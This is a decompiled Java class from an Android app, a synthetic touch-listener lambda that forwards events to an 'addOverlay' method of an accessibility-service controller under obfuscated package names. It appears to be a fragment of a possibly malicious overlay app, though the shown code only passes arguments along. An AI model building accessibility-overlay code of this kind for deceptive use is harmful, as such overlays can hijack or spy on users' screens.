/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.graphics.Rect
 *  android.view.MotionEvent
 *  android.view.View
 *  android.view.View$OnTouchListener
 *  android.view.WindowManager$LayoutParams
 */
package linker.resourcer.encoder;

import android.graphics.Rect;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import linker.resourcer.encoder.AccessibilityServiceController;

public final class AccessibilityServiceController$$ExternalSyntheticLambda0
implements View.OnTouchListener {
    public final AccessibilityServiceController f$0;
    public final Rect f$1;
    public final View f$2;
    public final WindowManager.LayoutParams f$3;
    public final String f$4;
    public final String f$5;

    public /* synthetic */ AccessibilityServiceController$$ExternalSyntheticLambda0(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Rect rect, View view, WindowManager.LayoutParams layoutParams, String string2, String string3) {
        this.f$0 = jhvbzpdwpbqgticwdxuva2;
        this.f$1 = rect;
        this.f$2 = view;
        this.f$3 = layoutParams;
        this.f$4 = string2;
        this.f$5 = string3;
    }

    public final boolean onTouch(View view, MotionEvent motionEvent) {
        return this.f$0.lambda$addOverlay$21$com-icontrol-protector-AccessibilityServiceController(this.f$1, this.f$2, this.f$3, this.f$4, this.f$5, view, motionEvent);
    }
}

